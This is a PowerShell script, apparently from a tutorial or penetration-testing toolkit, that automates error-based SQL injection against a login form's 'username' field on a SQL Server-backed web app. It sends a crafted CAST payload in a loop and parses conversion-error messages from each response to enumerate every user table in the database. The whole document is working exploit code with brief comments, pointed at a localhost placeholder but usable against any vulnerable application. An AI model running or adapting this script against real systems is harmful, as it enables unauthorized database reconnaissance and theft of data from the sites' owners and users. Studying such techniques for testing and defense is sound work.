
$BaseUrl = "http://localhost:3000/login" # the target URL
$postVariable = "username" # our vulnerable POST variable

$done=$false
$n=0

while ($done -eq $false) {

    # Construct the query as an error-based SQL injection.
    # Converting a value to an int will fail, and the error
    # message will hopefully tell us what string it tried
    # to convert.

    $argument=@"
' OR 0=CAST(ISNULL((
        SELECT OBJECT_SCHEMA_NAME([object_id])+'.'+[name]
        FROM sys.tables
        WHERE is_ms_shipped=0
        ORDER BY [object_id]
        OFFSET $n ROWS
        FETCH NEXT 1 ROWS ONLY
    ), '###done###') AS int) --
"@

    # POST the http request, collect the results.
    # I've set MaximumRedirection to 0 to avoid unnecessary requests,
    # and I've also added the SkipHttpErrorCheck switch, so the
    # cmdlet doesn't error out when the web server returns a HTTP/4xx.

    $response = (
        Invoke-WebRequest `
            -Uri $BaseUrl `
            -Method POST `
            -ContentType "application/x-www-form-urlencoded" `
            -Body ($postVariable+"="+[System.Web.HttpUtility]::UrlEncode($argument)) `
            -MaximumRedirection 0 `
            -SkipHttpErrorCheck).RawContent

    # Look for the tell-tale SQL Server error message for when a conversion
    # error ocurred:

    if ($response -like "*converting the * value '*' to data type int.") {

        # Identify the string we tried to convert. It's probably enclosed in
        # single quotes:

        $response = $response.Substring($response.IndexOf("converting the ")+1)
        $name = $response.split("'")[1]

        # We've added an ISNULL() to the SQL query so we know when to stop enumerating.
        # When the query returns "###done###", we can stop iterating.
        if ($name -eq "###done###") {
            $done = $true
        } else {
            $name
        }
    }

    # Next iteration
    $n=$n+1
}





